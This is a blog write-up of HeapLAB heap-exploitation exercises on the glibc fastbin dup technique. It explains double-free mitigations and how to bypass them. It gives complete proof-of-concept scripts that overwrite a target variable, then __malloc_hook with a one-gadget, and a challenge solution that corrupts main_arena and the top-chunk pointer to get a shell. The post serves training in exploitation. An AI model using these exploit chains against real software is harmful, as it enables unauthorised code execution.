---
layout: post
title:  "HeapLAB 1 - Fastbin Dup"
date:   2022-12-03 20:00:01 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## History

The fastbin dup was officially described at 2014, but it has been around for longer. \
It works for glibc versions `<= 2.31`.

## General 

A double-free bug may be useful in order to trigger this technique. 

The idea is that freeing an already free chunk, would link it twice towards its fastbin (or tcachebin) - so it could be allocated for two different requests simulaneously. 

For example, the first chunk of the fastbin would be allocated to store a secret password, while the second chunk from the fastbin would store a user-controlled data. \
Both of the allocations would point towards the same memory, hence producing a user-controlled secret password.

## Exercise

We are given a glibc `2.30` binary that requests `username` (with a sanity check for valid input size), as well as menu options - allowing allocating, writing to, and freeing chunks.

Upon writing, a check is performed - so no heap overflow occurs.

Our goal is to overwrite the `target` variable, located within `struct user` - right after the controlled input of `username`:

```bash
pwndbg> ptype user
type = struct user {
    char username[16];
    char target[16];
}
```

By executing request to free certain chunk twice, we would get the following error:

```bash
double free or corruption (fasttop)

Program received signal SIGABRT, Aborted.
```

This is due to a glibc double-free exploit mitigation. 

The stack frame:

```bash
 ► f 0   0x7ffff7a5204a raise+202
   f 1   0x7ffff7a530f5 abort+357
   f 2   0x7ffff7a93f07 __libc_message+599
   f 3   0x7ffff7a9b2aa
   f 4   0x7ffff7a9ccb4 _int_free+948
   f 5         0x400a22 main+603
   f 6   0x7ffff7a3e037 __libc_start_main+231
   f 7         0x40070a _start+42
```

By issuing `f 4`, we would switch to the `_int_free` function frame. By issuing `context code`, we can see the triggering code:

```c
if (__builtin_expect (old == p, 0))
    malloc_printerr ("double free or corruption (fasttop)");
p->fd = old;
*fb = p;
```

This mitigation is simple - it checks that the top of the bin, `old` is not the chunk we're going to add, `p`. 

## Exploitation

We can easily bypass the mitigation, by freeing another chunk within the same fastbin, before double-freeing our target chunk. \
By doing so, i got the same chunk twice within the same fastbin:

```bash
pwndbg> fastbins
fastbins
0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

The key idea, is that after performing the double free, another allocation of the same bin would be taking one of the doubly-freed chunks - `0x603000`.

Since the program allows us to control the user content of an allocated chunk, it will allow us to *override the fd pointer* - as it is reinterpreted as user content on the newly allocated chunk!

By overriding the `fd` ptr to arbitrary address, we can link it to some fake chunk we may control!

For example:

```c
# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b"A"*0x28)
chunk_B = malloc(0x28, b"B"*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Will be allocated with chunk_A.
# First 8 bytes are the fd ptr, so we create a fake, controlled chunk at 'user' address
dup = malloc(0x28, p64(elf.sym.user))
```

So the fastbins layout (the `user` struct begins with 16 bytes of username, hence the target located exactly at the user content of the chunk):

```bash
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x603030 —▸ 0x603000 —▸ 0x602010 (user) ◂— 0x58585858585858 /* 'XXXXXXX' */
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

By allocating 3 chunks to the 0x30 fastbin, we may override the target address. 

It is important to make sure our fake chunk `size` field corresponds to the fastbin allocation.

That is due to the following mitigation:

```c
if (__glibc_likely (victim != NULL))
  {
    size_t victim_idx = fastbin_index (chunksize (victim));
   if (__builtin_expect (victim_idx != idx, 0))
 ►   malloc_printerr ("malloc(): memory corruption (fast)");
   check_remalloced_chunk (av, victim, nb);
```

`victim` stands for the fastbin candidate we would like to re-allocate for the requested malloc call. 

There is a sanity check, that the chunk's `size` field corresponds with a correct fastbin index, `idx`. \
Therefore, it is important to insert a '1 = 0x31' to the 9th byte of the `username` field. 

Full POC:

```c
# Set the username field.
username = b"Z" * 8 + b"1"
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b"A"*0x28)
chunk_B = malloc(0x28, b"B"*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Will be allocated with chunk_A.
# First 8 bytes are the fd ptr, so we create a fake, controlled chunk at 'user' address
dup = malloc(0x28, p64(elf.sym.user))


chunk_C = malloc(0x28, b"C"*0x28)
chunk_D = malloc(0x28, b"D"*0x28)
exp_chunk = malloc(0x28, b"NODERNEDER,NEDERNODER!")
```

## Code Execution

We can override `__free_hook` with `system` (or a one-gadget). \
The cool thing about free, is that its argument points toward the *user data* of a certain chunk. This allows us easy set of the ptr data to `/bin/sh`. 

However we must make sure we can bypass the `size` fastbins mitigation, so there should be some low-value (`0x20 - 0x80`)quadword somewhere surrounding the hook.

Thankfully, `pwndbg` have the special command - `find_fake_fast`, which can help locate fake chunks that qualify for the fastbins:

```bash
pwndbg> find_fake_fast &__malloc_hook
Searching for fastbin sizes up to 0x80 starting at 0x7ffff7dd0ad8 resulting in an overlap of 0x7ffff7dd0b50
FAKE CHUNKS
Fake chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7ffff7dd0b2d
prev_size: 0xfff7dccee0000000
size: 0x7f
fd: 0xfff7a9fa10000000
bk: 0xfff7a9fed000007f
fd_nextsize: 0x7f
bk_nextsize: 0x00
```

`pwndbg` is pretty awesome - it found a matching non-aligned chunk, that meets our needs. 

This chunk resides 35 bytes before our `__malloc_hook` symbol. 

Because the new chunk's size is `0x7f`, we would have to change our malloc requests so they will land at the `0x70` fastbin.

By executing `one_gadget`, we can find candidates to overwrite `__malloc_hook`.



Note: watch out for incompatible flags in the fake `size` fields. \
In case `NON_MAIN_ARENA` is set (1), along with `CHUNK_IS_MMAPPED` cleared (0), a segfault would generate - as malloc attempts to locate non-existent arena. 

Shell POC:

```c
# Set the username field.
username = b"Z" * 8 + b"1"
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b"A"*0x68)
chunk_B = malloc(0x68, b"B"*0x68)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Will be allocated with chunk_A.
# First 8 bytes are the fd ptr, so we create a fake, controlled chunk at 'user' address
dup = malloc(0x68, p64(libc.sym.__malloc_hook - 35))


chunk_C = malloc(0x68, b"C"*0x68)
chunk_D = malloc(0x68, b"D"*0x68)

# Overwrite __malloc_hook with one gadget
exp_chunk = malloc(0x68, b"E"*19 + p64(libc.address + 0xe1fa1))

# Trigger the one gadget
malloc(1, b"")
```

## Challenge

The binary is 64-bit, glibc 2.30 binary. \
`checksec`:

```bash
Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'../.glibc/glibc_2.30_no-tcache'
```

We do have a libc leak. \
It is possible to only allocate `fastbin` chunks, excluding 0x70 sized.


The first goal is to find a good __hook symbol. 

All of `__realloc_hook, __malloc_hook, __memalign_hook` contained a single possible fastbin chunk, but its size field is 0x7f - meaning it resides within the 0x70 fastbin, which we cannot allocate.

My idea consist of multiple stages:

1. We will forge a fake chunk on the heap arena

2. This chunk will be allocated, so that the `top_chunk` head pointer resides within its `user_content`. \
In that way, we will be able to control the `top_chunk` ptr.

3. The value of the `top_chunk` ptr would point towards the `__malloc_hook` (or somewhere similar) - that way, the top chunk `user_content` would overlap with the `__malloc_hook`. 

4. We would trigger an allocation from the `top_chunk`, and write it a one-gadget. \
That way, the one-gadget is written into the `__malloc_hook`

5. We will trigger a malloc call. 


By examining the `main_arena` content, i've noticed it is possible to initialize the fastbins, thus creating candidates for `find_fake_fast` - meaning the top chunk would be able to serve as a fake chunk, which we can corrupt.

```bash
pwndbg> x/30gx &main_arena
0x7ffff7dd0b60 <main_arena>:    0x0000000000000000      0x0000000000000001
0x7ffff7dd0b70 <main_arena+16>: 0x00005555556031a0      0x0000555555603170
0x7ffff7dd0b80 <main_arena+32>: 0x0000555555603130      0x00005555556031c0
0x7ffff7dd0b90 <main_arena+48>: 0x0000555555603080      0x0000000000000000
0x7ffff7dd0ba0 <main_arena+64>: 0x0000555555603000      0x0000000000000000
0x7ffff7dd0bb0 <main_arena+80>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0bc0 <main_arena+96>: 0x0000555555603210      0x0000000000000000
0x7ffff7dd0bd0 <main_arena+112>:        0x00007ffff7dd0bc0      0x00007ffff7dd0bc0
0x7ffff7dd0be0 <main_arena+128>:        0x00007ffff7dd0bd0      0x00007ffff7dd0bd0
0x7ffff7dd0bf0 <main_arena+144>:        0x00007ffff7dd0be0      0x00007ffff7dd0be0
0x7ffff7dd0c00 <main_arena+160>:        0x00007ffff7dd0bf0      0x00007ffff7dd0bf0
0x7ffff7dd0c10 <main_arena+176>:        0x00007ffff7dd0c00      0x00007ffff7dd0c00
0x7ffff7dd0c20 <main_arena+192>:        0x00007ffff7dd0c10      0x00007ffff7dd0c10
0x7ffff7dd0c30 <main_arena+208>:        0x00007ffff7dd0c20      0x00007ffff7dd0c20
0x7ffff7dd0c40 <main_arena+224>:        0x00007ffff7dd0c30      0x00007ffff7dd0c30
```

The top chunk is located at `0x0000555555603210`. \
While `find_fake_top` finds chunks with `size = 0x55`, they aren't suitable, as their flags would trigger a segfault (non main arena, non mmapped chunk). 

However - while usually the fastbin head pointers at the arena are pointing towards the heap, within the fastbin dup technique, the last pointer at that bin is controlled by us, for example:

```bash
0x30: 0x603030 —▸ 0x603000 —▸ 0x602010 (user) ◂— 0x58585858585858 /* 'XXXXXXX' */
```

It means that once we malloc the 3 "regular" chunks, the pointer at the `main_arena` representing the head of the 0x30 fastbin, contains the value of `0x58585858585858` - hence completely attacker controlled.

Therefore, my idea is to forge the following heap layout:

```bash
pwndbg> x/30gx &main_arena
0x7ffff7dd0b60 <main_arena>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd0b70 <main_arena+16>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0b80 <main_arena+32>: 0x0000000000000000      0x0000000000000061 (fastbin[0x50])
0x7ffff7dd0b90 <main_arena+48>: 0x00007ffff7dd0b80      0x0000000000000000
0x7ffff7dd0ba0 <main_arena+64>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0bb0 <main_arena+80>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0bc0 <main_arena+96>: 0x0000555555603210      0x0000000000000000
```

I will overwrite the head of `fastbin[0x50]` to `0x0000000000000061`, and the head of `fastbin[0x60]` to its own address minus 16 bytes.

That way, upon requesting a `malloc(0x58)`, it will attempt to allocate it from `fastbin[0x60]`. \
Because the relevant free chunk is overwritten to `0x00007ffff7dd0b80`, its size field corresponds to `0x0000000000000061` - passing the fastbin size mitigation.

The address of `0x7ffff7dd0b90` and 0x58 bytes beyond, are considered as part of the `user_content` - so they will be writeable!

Since `0x0000555555603210` represents the pointer of the top chunk, i will be able to overwrite it - with (approximally) the address of `__malloc_hook`. 

Unlike fastbins, allocations from the top chunk do not have the "correct fastbin index" mitigation (duh).

There is a check is that the size of the top chunk is large enough, as well as the following check for the top_chunk size:

```c
if (__glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): corrupted top size");
```

Because `__malloc_hook` is surrounded by large pointers prior to it, we can easily forge a correct top chunk. 
We only have to make sure to give a certain offset, so the upper `size` mitigation won't apply. 

The `__malloc_hook` can then be easily overwritten with a one-gadget. 

Note that non of the one-gadget constraints are being satisfied, and the shell crashes right away (as it has malformed `argv, envp` values).

By browsing the `dash` manual page, we can see there is a possible trick. \
By stating a `-s` flag, the shell reads commands from stdin, and stops parsing the `argv, envp` parameters. \
This is equivalent to `argv[1] == NULL` - which is exactly what we want.

Another cool trick with `dash` is passing the `-p` flag, which keeps the euid bit of the shell on (may be useful for `suid` binaries). 

Full RCE PoC:

```python
# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, b"A"*8)
chunk_B = malloc(0x48, b"B"*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Write the quadword 0x61 at the main arena
malloc(0x48, p64(0x61))
# Request two more chunks, so the head of the 0x50 fastbin is now user controlled (0x61)
malloc(0x48, b"C"*8)
malloc(0x48, b"D"*8)

# Request two 0x60-sized chunks.
chunk_C = malloc(0x58, b"E"*8)
chunk_D = malloc(0x58, b"F"*8)

free(chunk_C)
free(chunk_D)
free(chunk_C)

# Set the fake chunk address
fake_chunk = p64(libc.sym.main_arena + 32)
malloc(0x58, fake_chunk)

# Request two allocations for setting a new head for the 0x60 fastbin
# This apperently controls argv[1], set it to "-s" to ignore bad pathnames
malloc(0x58, b"-s\x00")
malloc(0x58, b"Y"*8)

# set top chunk to point to __malloc_hook. Added 4, so its size field wont be too large
new_top = p64(libc.sym.__malloc_hook - 40 + 4)
malloc(0x58, b"H"*48 + new_top)

# overwrite __malloc_hook with one gadget. Note there is no fastbin[0x40], so allocations will be made by the top chunk
malloc(0x28, b"A"*20 + p64(libc.address + 0xe1fa1))

# trigger malloc_hook
malloc(0x18, b"AAAA")
```
